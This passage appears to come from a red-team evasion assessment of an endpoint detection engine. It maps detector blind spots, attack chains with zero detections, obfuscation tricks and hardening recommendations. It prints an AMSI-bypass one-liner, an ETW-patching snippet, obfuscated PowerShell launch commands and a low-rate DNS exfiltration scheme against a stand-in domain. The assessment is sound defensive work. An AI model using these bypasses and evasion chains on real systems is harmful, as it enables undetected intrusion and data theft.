| Boot/logon autostart via Startup folder | Easy | File path not in monitored persistence directories |
| AppInit_DLLs registry key | Easy | Registry path not monitored |
| Image File Execution Options (IFEO) debugger | Easy | Registry path not monitored |
| Linux: use `~/.bashrc`, `~/.profile` modifications | Easy | Not in monitored paths |
| Linux: use at/batch jobs | Easy | Not in monitored paths |
| macOS: LaunchAgent/LaunchDaemon plist | Easy | Entirely unmonitored platform |

**Robustness assessment: LOW.** Covers the most common persistence mechanisms
but the Windows registry has dozens of autostart locations, and the detector
monitors only 4. Linux coverage is limited to cron and systemd. macOS is
unmonitored.

### 7.6 `supply_chain` (SupplyChainDetector)

**What it detects:**
- Unsigned binaries executing from trusted paths (requires `signature_valid:
  false` AND signer not in trusted list)
- LOLBin abuse: `certutil -urlcache` downloads, `rundll32` with JavaScript/HTTP
- DLL sideloading: library loads by suspicious loaders (`rundll32`, `svchost`,
  `python`) from outside their expected directories

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Self-sign with a custom CA | Moderate | `signature_valid` may report `true`; custom signer not in trusted list but detection requires `Some(false)` -- `None` silently skips the check |
| Omit signature telemetry (most sensors) | Trivial | `signature_valid: None` bypasses the unsigned-binary check entirely; the `matches!(process.signature_valid, Some(false))` guard means absent data equals no detection |
| Execute from non-trusted paths (`C:\Users\*`, `/tmp/`) | Trivial | `trusted_path` check fails, so unsigned binary detection is skipped (LOLBin abuse and DLL sideloading checks still apply independently) |
| Use `certutil -decode` instead of `-urlcache` | Easy | Not checked (note: `supply_chain` uses `normalize_process_name` to strip path/`.exe`, so a renamed binary like `helper.exe` will NOT match `certutil`) |
| Use `rundll32` with local DLL (no HTTP/JavaScript) | Easy | Not flagged |
| DLL sideload from expected directory | Trivial | `file_path.starts_with(expected_dir)` returns true, so no finding |
| Sideload into a process not in `suspicious_loader_pairs` | Trivial | Only 3 loader pairs configured |
| Use `regsvr32 /s /n /u /i:payload.sct scrobj.dll` | Easy | `regsvr32` not in supply chain detector |

**Robustness assessment: LOW-MEDIUM.** The signature validation concept is
strong but the implementation uses `matches!(process.signature_valid, Some(false))`,
meaning `None` (the common case when sensors omit this field) silently skips
the unsigned-binary check entirely. This is a significant gap: the detector
only fires when the sensor explicitly reports an invalid signature, not when
signature data is absent. The LOLBin detection overlaps with
`suspicious_scripting` but adds no new coverage beyond `certutil -urlcache`
and `rundll32` with JavaScript/HTTP patterns. DLL sideloading detection is
a good architectural primitive but covers only 3 loader pairs (`rundll32`,
`svchost`, `python`).

### 7.7 `network_connect` (NetworkConnectDetector)

**What it detects:**
- Connections to suspicious ports (4444, 5555, 6667, 31337)
- Process-port mismatches (process connecting to a port outside its allowlist)
- C2 beaconing (periodic connections with low jitter)

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Use port 443 (standard HTTPS) | Trivial | Not in suspicious ports |
| Use port 80, 8080 | Trivial | Not in suspicious ports |
| Add jitter > 20% of mean interval | Easy | Exceeds jitter ratio threshold |
| Beacon every 20+ minutes | Easy | Exceeds window, insufficient samples |
| Use CDN/cloud IPs (varying destination IP) | Easy | Breaks BeaconKey aggregation |
| Single long-lived connection (WebSocket) | Easy | Only one NetworkConnect event |
| Domain fronting | Moderate | Legitimate destination IP, hidden true endpoint |
| Use DNS-over-HTTPS for C2 | Easy | Port 443 to known DoH providers |
| Inject into allowlisted process | Moderate | Bypasses process-port mismatch |

**Robustness assessment: MEDIUM.** The beaconing detector is architecturally
sound for detecting default Cobalt Strike / Metasploit callbacks. The
multi-heuristic approach (ports + allowlist + beaconing) provides layers. But
the specific thresholds are known to the adversary, and the `BeaconKey`
structure (`host_id`, `process_name`, `destination_ip`, `destination_port`,
`protocol`) requires exact match on all five fields -- any variation in
destination IP (CDN rotation), process name (injection), or port breaks
beacon sample aggregation.

### 7.8 `SuspiciousProcessTreeDetector` (detector.rs)

**What it detects:**
- Suspicious parent-child process relationships (Office apps spawning shells)
- Enhanced confidence for encoded commands or download hints in command lines

**Evasion surface:**

| Technique | Difficulty | Impact |
|-----------|-----------|--------|
| Intermediate process hop (Office -> legitimate process -> shell) | Easy | Breaks parent-child chain |
| Process injection into non-suspicious parent | Moderate | Spawned child has benign parent |
| Use `explorer.exe` or `svchost.exe` as intermediary | Easy | Neither in suspicious_parents |
| Spawn shell from a child of an Office app (grandchild) | Trivial | Only direct parent-child checked |
| Report parent as `winword.exe` instead of `winword` | Trivial | `Vec::contains` uses exact equality; `.exe` suffix prevents match against bare name in list |

**Robustness assessment: LOW.** Single-hop parent-child analysis is a weak
signal in isolation. Any process tree depth > 2 breaks the detection. Process
injection makes this trivially exploitable.

---

## 8. Compound Evasion Chains

A sophisticated adversary does not use a single evasion technique. This section
describes realistic multi-technique evasion chains that combine approaches from
Sections 3-6 to achieve objectives while remaining invisible to the entire
detector suite.

### 8.1 Chain: Initial Access Through Credential Theft

**Objective:** Obtain domain credentials and establish persistence.

**Steps:**
1. **Phishing email** delivers a `.lnk` file that executes `forfiles` (not in
   any LOLBin list) to download a custom Go binary via `bitsadmin` (not
   monitored).
   - **Evades:** `suspicious_scripting` (no powershell/lolbin match),
     `suspicious_process_tree` (explorer.exe -> forfiles.exe, not in
     suspicious parent/child)

2. **Custom binary** performs Kerberoasting using native Windows APIs.
   Process name is `svcmgr.exe`.
   - **Evades:** `credential_access` (process not in suspicious kerberoast
     list), `supply_chain` (binary in user temp, not a trusted path, and
     no signature data)

3. **Offline password cracking** produces service account credentials.
   Attacker authenticates via RDP using stolen credentials (**successful**
   authentication).
   - **Evades:** `lateral_movement` (only failed RDP tracked; successful
     auth is invisible)

4. **Persistence** via COM hijacking at
   `HKCU\Software\Classes\CLSID\{...}\InProcServer32`.
   - **Evades:** `persistence` (registry path not in
     `suspicious_registry_run_paths`)

5. **C2** over HTTPS to a Cloudflare-fronted endpoint, with 25-minute beacon
   intervals and 30% jitter.
   - **Evades:** `network_connect` (port 443, interval exceeds 15-min window,
     jitter exceeds 20% threshold, CDN IP varies)

**Result:** Full compromise with persistence and C2. Zero detections.

### 8.2 Chain: Data Exfiltration Through DNS

**Objective:** Exfiltrate 10 MB of sensitive data without triggering alerts.

**Steps:**
1. **Enumerate** target data using `wmic` for local process listing (no
   remote execution flags -> lateral movement detector ignores).

2. **Encode** data using a 256-word dictionary. Each DNS label encodes 3 bytes
   using 3 dictionary words hyphenated: `apple-fig-kale.exfil.com` (15 chars,
   entropy ~2.5 bits).

3. **Exfiltrate** at 7 queries per 60 seconds using A record queries:
   - Below burst threshold (8)
   - Below entropy threshold (3.5)
   - Below min subdomain length (20 chars with short words)
   - A record type (not TXT/NULL/CNAME)

4. **Duration:** 10 MB / (7 * 3 bytes/query * 60 seconds) = 10,000,000 /
   1,260 = ~7,936 minutes = ~5.5 days. Operationally viable for targeted
   exfiltration.

**Result:** Complete data exfiltration. Zero detections.

### 8.3 Chain: Supply Chain Compromise

**Objective:** Backdoor a system binary for persistent access.

**Steps:**
1. **Replace** a legitimate DLL in `C:\Windows\System32\` with a backdoored
   version. Set signer to "Microsoft Windows" and `signature_valid: true` (if
   the adversary has compromised the signing infrastructure or the sensor is
   unreliable).
   - **Evades:** `supply_chain` (signature appears valid, signer is trusted)

2. Alternatively, **DLL sideload** into `notepad.exe` (not in the 3
   `suspicious_loader_pairs`).
   - **Evades:** `supply_chain` (loader not configured for monitoring)

3. **Backdoor activates** on system boot, establishing C2 via DNS-over-HTTPS.
   - **Evades:** `network_connect` (port 443, legitimate DoH provider IP),
     `dns_exfiltration` (DNS queries go over HTTPS, not through the DNS
     resolver)

**Result:** Persistent access through trusted binary. Zero detections.

---

## 9. Fileless and Memory-Only Evasion Techniques

> **Added in v0.3** to address gap report findings on fileless malware,
> process hollowing, AMSI/ETW patching, and instrumentation tampering.

### 9.1 Structural Blind Spot: No Memory-Operation Telemetry

The `TelemetryPayload` enum has 7 variants, none of which represent in-memory
operations. The following well-documented attack families are therefore
**structurally undetectable** -- no amount of threshold tuning or indicator
expansion can address them without adding new telemetry payload variants:

| Technique | ATT&CK ID | Attack Description | Why STS Cannot Detect |
|-----------|-----------|--------------------|-----------------------|
| Process Hollowing | T1055.012 | Create a suspended process, unmap its image, write malicious code into its address space, resume execution. | No `MemoryOperation` payload. The `ProcessStart` event shows the original (legitimate) process name. The hollowed process inherits the parent-child relationship of the original. |
| Reflective DLL Injection | T1620 / T1620.001 | Load a DLL entirely from memory using a custom loader, never touching disk. | No `ImageLoad` or `MemoryOperation` payload. `FilePersistence` events only fire on disk writes. |
| Process Doppelganging | T1055.013 | Abuse NTFS transactions to create a process from a transacted file that is rolled back after process creation. | No NTFS transaction telemetry. The on-disk file never persists, so no `FilePersistence` event. |
| .NET Assembly Loading | T1620 | Use `Assembly.Load(byte[])` to execute arbitrary .NET assemblies entirely from memory. | No CLR runtime telemetry. Process name is a generic .NET host (`dotnet.exe`, `powershell.exe`). |
| Module Stomping | T1055.001 variant | Load a legitimate DLL, then overwrite its `.text` section with malicious code. | No `ImageLoad` telemetry to detect the initial load; no memory integrity verification. |

**Impact quantification:** MITRE ATT&CK tracks T1055 (Process Injection) as
used by 65%+ of tracked intrusion sets. T1620 (Reflective Code Loading) is used
by 30%+ of tracked APT groups. Together, these technique families represent the
single largest detection blind spot in the current engine.

### 9.2 AMSI and ETW Patching (T1562.001, T1562.006)

Modern Windows adversaries routinely disable security instrumentation before
executing payloads. Two patching techniques are particularly relevant:

**AMSI Patching.** The Antimalware Scan Interface (AMSI) provides a hook for
security products to inspect script content (PowerShell, VBScript, JScript)
before execution. Adversaries patch the `AmsiScanBuffer` function in memory to
return `AMSI_RESULT_CLEAN` for all inputs:

```powershell
# Common one-liner (obfuscated variants exist)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
    .GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

The current `SuspiciousScriptingDetector` does not check for `AmsiUtils`,
`amsiInitFailed`, `AmsiScanBuffer`, or related strings. Even if it did, the
command line is trivially obfuscated via string concatenation, variable
substitution, or reflection-based access.

**ETW Patching.** Event Tracing for Windows (ETW) provides kernel-level event
delivery to consumers. Adversaries patch `EtwEventWrite` or
`NtTraceControl` in `ntdll.dll` to suppress ETW events from the patched process:

```c
// Patch EtwEventWrite to return immediately
*(BYTE*)GetProcAddress(GetModuleHandle("ntdll"), "EtwEventWrite") = 0xC3; // ret
```

This blinds any ETW-dependent telemetry source for that process. Since the
`TelemetryPayload` enum has no `InstrumentationTamper` variant, the engine
cannot detect that its own telemetry pipeline is being degraded.

**Required telemetry additions:**
- `InstrumentationTamper` payload variant capturing AMSI health events,
  ETW provider integrity checks, and kernel callback modifications.
- Heartbeat-based sensor liveness detection (absence of expected events from
  a process as a signal of instrumentation tampering).

### 9.3 Environment Variable Obfuscation

Beyond the caret insertion and string concatenation covered in Section 10,
environment variable expansion is a potent obfuscation vector on Windows:

```cmd
:: %COMSPEC% expands to C:\Windows\system32\cmd.exe
:: %COMSPEC:~-3% extracts "exe"
set a=power& set b=shell& %a%%b% -enc AAAA

:: Using %ProgramData% substring extraction
%ProgramData:~0,1%%ProgramData:~-1%wershell -enc AAAA
```

These techniques exploit the fact that `cmd.exe` performs environment variable
expansion before the child process is created. By the time the telemetry source
captures the `ProcessStart` event, the command line may contain either the
unexpanded variables (if captured before expansion) or the expanded result (if
captured after). In either case, the `SuspiciousScriptingDetector`'s
`contains()` checks on the lowercased string will fail to match the fragmented
indicators.

**Current detection rate:** 0% for all environment variable obfuscation variants.
The `contains("powershell")` check fails on `%a%%b%` where `a=power` and
`b=shell`, regardless of case normalization.

---

## 10. Command-Line Obfuscation Depth Analysis

> **Added in v0.3** to quantify the weakness of `contains()` on lowercased
> strings for command-line detection.

### 10.1 The Fundamental Problem

Every detector that inspects command lines uses the same pattern:

```rust
let command_line = process.command_line.to_ascii_lowercase();
// ... later ...
command_line.contains("some_indicator")
```

This approach applies to: `SuspiciousProcessTreeDetector` (encoded flags,
download hints), `SuspiciousScriptingDetector` (encoded indicators, download-
execute indicators, LOLBin abuse), `LateralMovementDetector` (remote execution
indicators), and `SupplyChainDetector` (certutil/rundll32 patterns).

The `to_ascii_lowercase()` normalization handles case variation but is defeated
by every other obfuscation class.

### 10.2 Obfuscation Techniques and Detection Rates

| Obfuscation Class | Example | Defeats `contains()` | Estimated Prevalence |
|-------------------|---------|---------------------|---------------------|
| **Caret Insertion** (cmd.exe) | `p^o^w^e^r^s^h^e^l^l` | Yes -- `contains("powershell")` fails on `p^o^w^e^r^s^h^e^l^l` | High (trivial, widely documented) |
| **Environment Variable Expansion** | `%COMSPEC:~0,3%ershell` | Yes -- unexpanded variable text does not match indicator | High |
| **String Concatenation** (PowerShell) | `&('pow'+'ershell')` | Yes -- indicator is split across string literals | High |
| **Unicode Homoglyphs** | `powershell` with Cyrillic `e` (U+0435) | Yes -- `to_ascii_lowercase()` does not map Unicode homoglyphs to ASCII equivalents | Medium (targeted) |
| **FOR Loop Variable Substitution** (cmd.exe) | `for /f %i in ('power') do %ishell -enc` | Yes -- indicator never appears as contiguous string | Medium |
| **WMI Indirect Execution** | `wmic process call create "powershell -enc"` | Partial -- if `wmic` is in `process_name`, the `command_line` check may still match the inner command, but only if the full string is captured | Medium |
| **Invoke-Expression with Variable** | `$x='pow';$y='ershell';iex "$x$y -enc AAAA"` | Yes -- `contains("-enc")` may match but the PowerShell detection requires both the process name match AND the indicator | High |
| **Base64 of Non-Base64** | XOR-encode payload, then base64 the XOR blob | Yes -- `frombase64string` may match, but the decoded content is still XOR-encrypted, so the actual malicious payload is never visible in the command line | Medium |

### 10.3 Quantified Impact

For the `SuspiciousScriptingDetector`, we can estimate detection rates against
each obfuscation class by analyzing the code paths:

- **Encoded PowerShell path:** Requires `process_name` containing `powershell`
  or `pwsh` AND `command_line` containing one of (`-enc`, `-encodedcommand`,
  `frombase64string`, `base64`). Caret insertion in either the process name
  (via parent cmd.exe: `p^owershell`) or the flag (`-e^nc`) defeats both checks.
  **Estimated detection rate against caret-obfuscated commands: 0%.**

- **Download-execute path:** Requires `command_line` matching a download indicator
  AND an execution indicator. String concatenation in PowerShell (`'down'+'loadstring'`)
  defeats the download indicator match. **Estimated detection rate against
  concatenation-obfuscated download-execute: 0%.**

- **LOLBin path:** Requires `process_name` containing the LOLBin name. Binary
  renaming (not obfuscation per se, but related) defeats this entirely.
  Obfuscation of the command-line patterns (e.g., `cer^tutil -urlcache`)
  defeats the per-LOLBin abuse checks. **Estimated detection rate against
  caret-obfuscated LOLBin commands: 0%.**

### 10.4 Recommended Mitigations

1. **Command-line deobfuscation preprocessor.** Before indicator matching, apply
   a normalization pass that strips carets (`^`), expands known environment
   variables (`%COMSPEC%`, `%SystemRoot%`), and resolves common string
   concatenation patterns. This is a medium-effort change that dramatically
   improves detection resilience.

2. **Script block log telemetry.** For PowerShell specifically, script block
   logging captures the *deobfuscated* content after the PowerShell engine has
   resolved all variables, concatenation, and encoding. Adding a
   `ScriptBlockLog` telemetry variant would let detectors operate on the true
   executed content rather than the obfuscated command line.

3. **Unicode normalization.** Apply NFKC Unicode normalization before
   `to_ascii_lowercase()` to collapse homoglyphs to their ASCII equivalents.

---

## 11. Adversary Profile Analysis

> **Added in v0.3** to map specific threat group TTPs against the current
> detector suite and identify which attacks succeed undetected.

### 11.1 Methodology

For each adversary group, we select their top-5 documented techniques (sourced
from MITRE ATT&CK group profiles and published incident reports) and evaluate
whether the current `swarm-whisker` detector suite would produce a finding. A
technique is scored as Detected (D), Partially Detected (P), or Undetected (U).

### 11.2 APT29 (Cozy Bear) -- Russian SVR

| Technique | ATT&CK ID | Detector Coverage | Result |
|-----------|-----------|-------------------|--------|
| WMI event subscription persistence | T1546.003 | No WMI event telemetry; `PersistenceDetector` monitors registry/file persistence only | **U** |
| EnvyScout HTML smuggling | T1027.006 | No browser/HTML telemetry; no `FilePersistence` event for browser-decoded blobs | **U** |
| SAML token forging (Golden SAML) | T1606.002 | No cloud authentication telemetry | **U** |
| Cobalt Strike with 40%+ adaptive jitter | T1071.001 / T1573 | `NetworkConnectDetector` `beacon_max_jitter_ratio` = 0.20; 40% jitter exceeds threshold, no beaconing finding produced | **U** |
| Service-based lateral movement via compromised SolarWinds | T1195.002 / T1021 | `SupplyChainDetector` catches unsigned binaries in trusted paths, but SolarWinds DLL was validly signed | **P** |

**Detection rate against APT29 top-5 TTPs: 0 Detected, 1 Partial, 4 Undetected (10%).**

### 11.3 FIN7 -- Financial Crime Group

| Technique | ATT&CK ID | Detector Coverage | Result |
|-----------|-----------|-------------------|--------|
| COM object abuse for execution | T1559.001 | No COM execution telemetry; no detector watches `ProcessStart` events with COM-related indicators | **U** |
| SQLRat memory-resident payloads | T1620 | No `MemoryOperation` telemetry | **U** |
| JSSLoader with dynamic C2 domain generation (DGA) | T1568.002 | `DnsExfiltrationDetector` uses entropy and known-pattern matching; DGA domains have high entropy and would likely trigger if subdomains are >= 20 chars, but many DGA domains use short base domains (< 20 char subdomain) | **P** |
| Spearphishing with weaponized documents | T1566.001 / T1204.002 | `SuspiciousProcessTreeDetector` catches Office-to-shell spawns, but FIN7 uses intermediate processes (e.g., `wscript.exe` from Office, which is in `suspicious_children`) | **P** |
| PowerShell with obfuscation and AMSI bypass | T1059.001 / T1562.001 | `SuspiciousScriptingDetector` catches unobfuscated PowerShell; AMSI bypass and string concatenation obfuscation evade detection (see Section 10) | **P** |

**Detection rate against FIN7 top-5 TTPs: 0 Detected, 3 Partial, 2 Undetected (30%).**

### 11.4 Lazarus Group -- North Korean State-Sponsored

| Technique | ATT&CK ID | Detector Coverage | Result |
|-----------|-----------|-------------------|--------|
| Custom packed loaders with runtime unpacking | T1027.002 | No file entropy analysis; no PE header inspection | **U** |
| In-memory-only payload execution | T1620 | No `MemoryOperation` telemetry | **U** |
| Watering hole via compromised legitimate sites | T1189 | No URL reputation telemetry; no browser-level event capture | **U** |
| DLL sideloading into legitimate applications | T1574.001 | `SupplyChainDetector` covers 3 loader pairs (`rundll32`, `svchost`, `python`); Lazarus targets application-specific loaders not in this list | **P** |
| Credential harvesting via custom keylogger | T1056.001 | No keylogger or input capture telemetry | **U** |

**Detection rate against Lazarus top-5 TTPs: 0 Detected, 1 Partial, 4 Undetected (10%).**

### 11.5 APT41 -- Chinese State-Sponsored (Dual Espionage/Financial)

| Technique | ATT&CK ID | Detector Coverage | Result |
|-----------|-----------|-------------------|--------|
| Rootkit deployment (kernel-level persistence) | T1014 | No kernel/driver telemetry | **U** |
| DLL search-order hijacking at load time | T1574.001 | `SupplyChainDetector` fires on `FilePersistence` events for library writes from known loaders, but runtime DLL search-order hijacking produces an `ImageLoad` event (no such telemetry type) not a `FilePersistence` event | **U** |
| Bootkit persistence | T1542 | No boot/firmware telemetry | **U** |
| Exploitation of public-facing applications | T1190 | No web application telemetry | **U** |
| Scheduled task via `schtasks.exe` with obfuscated command | T1053.005 | `PersistenceDetector` detects file writes to task directories and `schtasks` content; the `ProcessStart` event for `schtasks.exe` itself is not checked by `PersistenceDetector` (it checks `FilePersistence` and `RegistryPersistence` only) | **P** |

**Detection rate against APT41 top-5 TTPs: 0 Detected, 1 Partial, 4 Undetected (10%).**

### 11.6 Volt Typhoon -- Chinese State-Sponsored (Critical Infrastructure)

| Technique | ATT&CK ID | Detector Coverage | Result |
|-----------|-----------|-------------------|--------|
| Living-off-the-land via `netsh` | T1562.004 / T1016 | `netsh` not in any LOLBin list or indicator list | **U** |
| LOLBin chains: `certutil` -> `rundll32` -> `wmic` | T1218 / T1047 | Individual LOLBins partially detected, but the sequential chain pattern (each individually appearing benign) has no behavioral correlation; `certutil -decode` is not detected by `SupplyChainDetector` (only `-urlcache` checked) | **P** |
| `wmic` for local reconnaissance (no `/node:` flag) | T1047 / T1082 | `LateralMovementDetector` requires `/node:` AND `process call create` for `wmic`; local `wmic` usage is invisible | **U** |
| `ntdsutil` for AD database extraction | T1003.003 | Not in any indicator list | **U** |
| Minimal C2 footprint via legitimate cloud services | T1102 | No web service/cloud C2 detection | **U** |

**Detection rate against Volt Typhoon top-5 TTPs: 0 Detected, 1 Partial, 4 Undetected (10%).**

### 11.7 Summary: Detection Coverage Against Threat Groups

| Threat Group | Detected | Partial | Undetected | Effective Rate |
|-------------|----------|---------|------------|----------------|
| APT29 | 0 | 1 | 4 | 10% |
| FIN7 | 0 | 3 | 2 | 30% |
| Lazarus | 0 | 1 | 4 | 10% |
| APT41 | 0 | 1 | 4 | 10% |
| Volt Typhoon | 0 | 1 | 4 | 10% |
| **Average** | **0** | **1.4** | **3.6** | **14%** |

No single threat group TTP from the top-5 is fully detected. The average
effective detection rate of 14% (counting Partial as 50% credit) demonstrates
that the current suite is calibrated for Tier 1 (commodity malware) adversaries
and provides minimal resistance to Tier 2-3 operators.

---

## 12. Unused and Dead-Code Detection Paths

> **Added in v0.3** to document declared-but-unused detection infrastructure
> and its implications.

### 12.1 `PersistenceProfile::dormancy_window_secs` -- Declared But Never Used

The `PersistenceProfile` struct declares a `dormancy_window_secs` field (default:
86,400 seconds / 24 hours). This field is:

- **Stored** in the detector struct (`self.dormancy_window_secs`).
- **Validated** in `PersistenceProfile::validate()` (must be > 0).
- **Emitted** in evidence JSON (`"dormancy_window_secs": self.dormancy_window_secs`).
- **Never used** in any detection logic.

Neither `evaluate_registry()` nor `evaluate_file()` references
`self.dormancy_window_secs` for confidence scoring, temporal correlation, or
finding generation. The field appears to be the skeleton of an intended
time-based persistence heuristic -- for example, flagging persistence mechanisms
that activate only after a dormancy period (delayed execution via scheduled task
intervals, or persistence that fires only on reboot after `dormancy_window_secs`
without re-detection).

**Impact:** The field's presence in evidence JSON may mislead analysts into
believing that temporal dormancy analysis is being performed. It is not. This
is dead configuration that should either be implemented as an active detection
parameter or removed to avoid confusion.

### 12.2 `signature_valid: None` Silent Skip in Supply Chain Detection

The `SupplyChainDetector::evaluate_process()` method uses the guard:

```rust
if trusted_path && matches!(process.signature_valid, Some(false)) && !signer_trusted {
```

This means the unsigned-binary-in-trusted-path detection fires ONLY when
`signature_valid` is explicitly `Some(false)`. When `signature_valid` is `None`
-- the common case when telemetry sources omit signature validation data -- the
entire check is silently skipped. The detector does not log, warn, or produce
a lower-confidence finding for the `None` case.

**Impact quantification:** In production telemetry, the majority of process
start events arrive with `signature_valid: None` because most sensors (eBPF on
Linux, basic Sysmon configurations) do not validate Authenticode signatures.
This means the unsigned-binary detection path is effectively inert for all
Linux telemetry and for Windows telemetry from sensors without signature
validation configured.

**Recommended fix:** Treat `signature_valid: None` as suspicious when a process
executes from a trusted path with an unknown or empty signer. Produce a
medium-confidence finding with evidence indicating that signature data was
absent, allowing operators to triage based on signer and path context.

### 12.3 Threat-Intel Types: Defined But Never Queried

`ThreatIntelEntry` and `ThreatIntelIndicatorType` are defined in
`crates/swarm-core/src/pheromone.rs` with support for three indicator families:

- `IpAddress` -- for matching against `NetworkConnectEvent.destination_ip`
- `Domain` -- for matching against `DnsQueryEvent.query_name`
- `FileHash` -- for matching against executable hashes (no hash field in
  `ProcessStartEvent` currently)

No detector in `swarm-whisker` queries the pheromone substrate for threat-intel
indicators during evaluation. The `DetectionStrategy::evaluate()` trait
signature takes only a `&TelemetryEvent` reference, with no access to the
substrate or threat-intel store.

**Impact:** Operator-seeded IOCs (known-bad IPs, domains, file hashes) have no
effect on detection. An operator who adds a known C2 domain to the threat-intel
store would expect `DnsExfiltrationDetector` to flag queries to that domain;
it does not. Similarly, known-bad IPs are not checked by `NetworkConnectDetector`.

**Recommended fix:** Extend the `DetectionStrategy` trait or provide a
threat-intel lookup service that detectors can query during evaluation. At
minimum, add IP and domain matching to `NetworkConnectDetector` and
`DnsExfiltrationDetector` respectively.

---

## 13. Hardening Recommendations

### 13.1 Near-Term (Configuration Changes, No New Code)

**R1. Expand LOLBin lists.**
Add at minimum: `msiexec`, `bitsadmin`, `installutil`, `regasm`, `regsvcs`,
`forfiles`, `pcalua`, `esentutl`, `expand`, `msxsl` to `lolbin_processes` in
`SuspiciousScriptingProfile`. Add corresponding `is_lolbin_abuse` match arms.
Also add `certutil -decode` to the existing `certutil` arm in `is_lolbin_abuse`.
Priority: **High.** Effort: **Low.**

**R1a. Normalize process names in SuspiciousProcessTreeDetector.**
The process tree detector uses `Vec::contains()` for exact match on lowercased
names, but does not strip `.exe` suffixes or path prefixes. If telemetry
reports `winword.exe` instead of `winword`, the match silently fails. Apply
`normalize_process_name()` (already used by `credential_access` and
`supply_chain`) to parent and child names before comparison.
Priority: **High.** Effort: **Low** (one-function change).

**R2. Expand suspicious kerberoast process list.**
Add common Go and Rust binary names used in offensive tooling. Better: invert
the logic to allowlist *expected* Kerberos TGS requestors rather than
blocklisting known-bad ones.
Priority: **High.** Effort: **Low.**

**R3. Expand persistence registry paths.**
Add: `RunServices`, `RunServicesOnce`, `AppInit_DLLs`,
`Image File Execution Options`, `Winlogon\Shell`, `Winlogon\Userinit`,
`BootExecute`, `HKCU\...\Classes\CLSID` (COM hijacking).
Priority: **High.** Effort: **Low.**

**R4. Tighten DNS exfiltration thresholds.**
Reduce `min_subdomain_length` from 20 to 12. Reduce `entropy_threshold` from
3.5 to 3.0. This will increase false positives for legitimate CDN subdomains
but closes the short-subdomain bypass. Complement with a broader allowlist.
Priority: **Medium.** Effort: **Low.**

**R5. Tighten beacon detection parameters.**
Increase `beacon_window_ms` from 900,000 (15 min) to 3,600,000 (60 min).
Increase `beacon_max_jitter_ratio` from 0.20 to 0.35. Decrease
`beacon_min_sample_count` from 4 to 3 (the validation floor in
`NetworkConnectProfile::validate()`). Note: the profile validates that
`beacon_window_ms >= beacon_min_interval_ms * (beacon_min_sample_count - 1)`,
so these values must remain consistent. This catches longer-interval and
higher-jitter beacons at the cost of more false positives.
Priority: **Medium.** Effort: **Low.**

**R6. Add more suspicious ports.**
Add: 8443, 8080, 1080 (SOCKS), 3128 (Squid proxy), 9090, 4443, 8888, 53
(DNS over TCP to non-DNS servers), and common Cobalt Strike / Metasploit
listener ports.
Priority: **Low.** Effort: **Low.**

### 13.2 Medium-Term (New Detection Logic)

**R7. Implement executable hash tracking.**
Add `executable_hash` to `ProcessStartEvent`. Compare against known-good hash
baselines. This defeats binary renaming: a renamed `certutil.exe` still has
the `certutil.exe` hash. This is the single highest-impact hardening measure.
Priority: **Critical.** Effort: **Medium.**

**R8. Implement process-tree depth analysis.**
Replace single-hop parent-child checks with ancestor chain analysis. Track the
full process tree (grandparent -> parent -> child) and flag suspicious chains
at any depth. Requires stateful process tracking across events.
Priority: **High.** Effort: **Medium.**

**R9. Implement successful-authentication lateral movement detection.**
Track successful authentications (SSH, RDP, WinRM) from source-target pairs
that have not been observed historically. First-seen source-target pairs should
produce medium-confidence findings. Requires a baseline of normal authentication
patterns (see doc 06-Behavioral Baselines).
Priority: **Critical.** Effort: **Medium.**

**R10. Implement multi-window DNS analysis.**
Analyze DNS query patterns at multiple time scales (1 min, 5 min, 30 min,
24 hr). Look for sustained low-rate exfiltration that is invisible at any
single window size but anomalous in aggregate. Total bytes transferred per
external domain per day is a strong signal.
Priority: **High.** Effort: **Medium.**

**R11. Implement domain-level beacon analysis.**
Modify `BeaconKey` to group by resolved domain (from DNS queries) in addition
to IP address. This prevents CDN IP rotation from breaking beacon aggregation.
Requires correlating `NetworkConnect` events with recent `DnsQuery` events.
Priority: **High.** Effort: **Medium.**

**R12. Add pheromone deposit rate limiting.**
Implement per-agent, per-threat-class rate limits on deposits. For example,
no agent may deposit more than 10 pheromones per threat class per 5-minute
window. Excess deposits are silently dropped. This mitigates both alert
fatigue attacks and concentration inflation.
Priority: **Medium.** Effort: **Low.**

**R13. Add pheromone deposit content validation.**
Validate that deposited pheromone `confidence` and `severity` values are
consistent with the detector's actual findings. The substrate could require
that deposits include a reference to the `finding_id` that triggered them and
verify that the finding exists in the local detection log.
Priority: **Medium.** Effort: **Medium.**

### 13.3 Long-Term (Architectural Changes)

**R14. Implement behavioral baselines.**
Build per-host, per-user, per-application baselines for normal activity
patterns. Detect deviations from baseline rather than matching against static
indicator lists. This is the primary defense against mimicry attacks.
See doc 06-Behavioral Baselines for detailed design.
Priority: **Critical.** Effort: **High.**

**R15. Implement cross-detector correlation.**
The `CompositeDetector` currently dispatches events to all strategies and
collects findings independently. Add a correlation layer that identifies
attack chains spanning multiple threat classes. For example: `credential_access`
finding + `lateral_movement` finding + `persistence` finding within a time
window on related hosts should produce a compound finding with elevated
confidence, even if individual findings are medium-confidence.
Priority: **High.** Effort: **High.**

**R16. Implement telemetry integrity verification.**
Add cryptographic attestation to telemetry events (signed by the sensor agent
with a hardware-backed key where available). This prevents a compromised host
from suppressing or modifying telemetry events before they reach the detector.
See doc 07-Self-Protection.
Priority: **High.** Effort: **High.**

**R17. Increase `min_sources_for_escalation` for high-severity threat classes.**
For `Incident` mode transitions, require `min_sources >= 3` (or a majority of
active agents). This raises the bar for escalation manipulation from 2
compromised agents to 3.
Priority: **Medium.** Effort: **Low** (config change) / **Medium** (dynamic
agent count tracking).

**R17a. Count distinct physical agents, not strategy-scoped IDs.**
Currently `concentration_for()` counts `agent_id.0` strings, and
`strategy_scoped_agent_id()` produces values like `"whisker-a:dns_exfiltration"`.
Two strategies on one physical agent count as two distinct sources. For
anti-Sybil purposes, `distinct_sources` should count the base agent ID
(stripping the `:strategy` suffix) to ensure that `min_sources_for_escalation`
reflects genuinely independent observers.
Priority: **High.** Effort: **Low** (change the `sources.insert()` call to
extract the base agent ID).

**R18. Implement detector ensembling.**
Run multiple independent detection models in parallel for the same threat
class. Each model uses different features or algorithms. Require agreement
from K-of-N models before producing a finding. This forces an adversary to
evade all models simultaneously, dramatically increasing evasion difficulty.
Priority: **Medium.** Effort: **High.**

**R19. Implement canary tokens in the pheromone substrate.**
